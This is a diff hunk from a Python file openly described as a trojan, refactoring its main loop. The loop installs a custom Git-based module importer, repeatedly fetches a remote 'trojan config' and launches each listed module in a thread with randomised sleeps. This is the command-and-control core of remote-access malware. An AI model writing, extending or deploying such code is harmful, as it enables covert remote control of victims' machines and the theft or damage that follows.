@@ -127,20 +127,17 @@ def module_runner(module):
 
 # main trojan loop
 sys.meta_path = [GitImporter()]
-def main_func():
-    while True:
 
-        if task_queue.empty():
+while True:
 
-            config = get_trojan_config()
+    if task_queue.empty():
 
-            if config is not None:
-                for task in config:
-                    t = threading.Thread(target=module_runner, args=(task['module'],))
-                    t.start()
-                    time.sleep(random.randint(1, 10))
+        config = get_trojan_config()
 
-        time.sleep(random.randint(5, 10))
+        if config is not None:
+            for task in config:
+                t = threading.Thread(target=module_runner, args=(task['module'],))
+                t.start()
+                time.sleep(random.randint(1, 10))
 
-main_thread = threading.Thread(target=main_func)
-main_thread.start()
+    time.sleep(random.randint(5, 10))
